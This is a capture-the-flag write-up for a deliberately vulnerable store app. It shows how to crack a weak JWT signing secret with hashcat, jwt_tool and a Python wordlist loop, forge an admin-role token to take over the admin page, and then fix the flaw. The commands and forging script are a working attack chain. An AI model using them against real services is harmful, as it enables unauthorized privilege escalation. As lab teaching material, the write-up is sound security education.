---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-01-23T20:11:00Z
title: "JWT Weak Secret: Cracking the Key to Forge Admin Access in OopsSec Store"
slug: jwt-weak-secret-admin-bypass
draft: false
tags:
  - writeup
  - authentication
  - jwt
  - ctf
description: Exploiting a JWT implementation that uses a weak signing secret to crack the key, forge admin credentials, and access restricted endpoints.
---

This writeup demonstrates how a JWT implementation using a weak signing secret allows attackers to brute-force the key, forge authentication tokens, and escalate privileges from a regular customer account to administrator access.

## Table of contents

## Environment setup

Initialize the OopsSec Store application in a new directory:

```bash
npx create-oss-store oss-store
cd oss-store
npm run dev
```

The installer retrieves dependencies, initializes a local SQLite database, seeds test user accounts, and starts the development server. Once the server is running, navigate to `http://localhost:3000` and authenticate using the test credentials displayed on the login page. For this exercise, log in as Alice, a standard customer account.

## Reconnaissance

The application uses JSON Web Tokens for session management. After successful authentication, the backend issues a token that is stored in the browser's local storage and transmitted with subsequent requests.

The application footer contains a visible link to `/admin`. Attempting to access this endpoint while authenticated as a customer account results in an access denied response, indicating role-based access control is enforced.

![Access Denied - /admin](../../assets/images/jwt-weak-secret-admin-bypass/access-denied.png)

## Token extraction and analysis

Open the browser's developer tools and navigate to Application > Local Storage. The authentication token is stored under the key `authToken`.

Decoding this token using [jwt.io](https://jwt.io) reveals the following structure:

**Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**

```json
{
  "id": "cmk7hzehr0001togvwvjt810d",
  "email": "alice@example.com",
  "role": "CUSTOMER",
  "hint": "The secret is not so secret",
  "exp": 1768763557
}
```

The `alg: "HS256"` header indicates that the token is signed using HMAC-SHA256. This implementation requires knowledge of the signing secret to forge valid tokens.

Note the `hint` field in the payload: "The secret is not so secret". This suggests the signing key is weak and potentially guessable or crackable.

## Identifying the vulnerability

The presence of a signature does not guarantee security. If the signing secret is weak or guessable, an attacker can recover it through brute-force or dictionary attacks.

Common weak secrets include:

- `secret`
- `password`
- `jwt`
- `key`
- Application or company names

## Cracking the JWT secret

Save the JWT token to a file:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNta3I4eW4zNDAwMDF0b3A2NjJ6OXkzb20iLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwicm9sZSI6IkNVU1RPTUVSIiwiaGludCI6IlRoZSBzZWNyZXQgaXMgbm90IHNvIHNlY3JldCIsImV4cCI6MTc2OTgwMDYzNH0.xYuUP20NgY6Pz9cktBEvS-_dczsDFKQQnhyHCvl7ckc" > jwt.txt
```

Use `hashcat` to crack the secret with a wordlist:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat](../../assets/images/jwt-weak-secret-admin-bypass/hashcat.png)

Alternatively, use `jwt_tool`:

```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

Or create a simple script to test common secrets:

```python
import jwt
import sys

token = sys.argv[1]
wordlist = ["secret", "password", "jwt", "key", "oopssec", "admin", "test"]

for secret in wordlist:
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        break
    except jwt.InvalidSignatureError:
        continue
```

The secret is successfully recovered: `secret`

## Exploitation

With the recovered secret, forge a new token with elevated privileges:

```python
import jwt

payload = {
    "id": "cmk7hzehr0001togvwvjt810d",
    "email": "alice@example.com",
    "role": "ADMIN",
    "hint": "The secret is not so secret",
    "exp": 1768763557
}

forged_token = jwt.encode(payload, "secret", algorithm="HS256")
print(forged_token)
```

Replace the `authToken` value in local storage with the forged token and refresh the page. Navigate to `/admin` to confirm successful privilege escalation.

![Admin page](../../assets/images/jwt-weak-secret-admin-bypass/admin-flag.png)

## Flag

Upon accessing the admin dashboard with the forged token, the flag is displayed:

```
OSS{w34k_jwt_s3cr3t_k3y}
```

## Remediation

Proper JWT implementation requires several security controls.

**Use strong, randomly generated secrets:**

```bash
openssl rand -base64 32
```

**Store secrets securely in environment variables:**

```javascript
import jwt from "jsonwebtoken";

jwt.sign(payload, process.env.JWT_SECRET, {
  algorithm: "HS256",
  expiresIn: "7d",
});
```

**Verify token signatures on every request:**

```javascript
jwt.verify(token, process.env.JWT_SECRET);
```

**Retrieve authorization data from the database:**

```javascript
const user = await db.users.findById(decoded.id);

if (user.role !== "ADMIN") {
  return res.status(403).send("Forbidden");
}
```

**Consider asymmetric algorithms (RS256, ES256)** for scenarios where token verification happens on different services than token issuance, eliminating the need to share secrets.

The token should authenticate identity only. Authorization decisions must be derived from trusted server-side data sources, not from client-supplied claims embedded in the token.
